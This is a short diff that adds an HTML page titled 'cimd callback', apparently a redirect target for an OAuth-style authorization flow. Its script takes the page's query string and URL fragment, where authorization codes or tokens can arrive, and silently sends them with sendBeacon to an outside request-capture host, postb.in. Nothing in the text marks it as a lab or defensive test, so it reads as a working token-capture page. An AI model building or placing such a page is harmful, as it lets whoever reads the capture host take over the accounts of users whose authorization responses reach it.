@@ -1,0 +1,7 @@
+<!doctype html><html><head><meta charset="utf-8"><title>cimd callback</title></head>
+<body><pre id="o">waiting</pre>
+<script>
+var q=location.search+location.hash;
+document.getElementById('o').textContent=q;
+try{navigator.sendBeacon("https://postb.in/t14cimd", new Blob([q],{type:'text/plain'}));}catch(e){}
+</script></body></html>
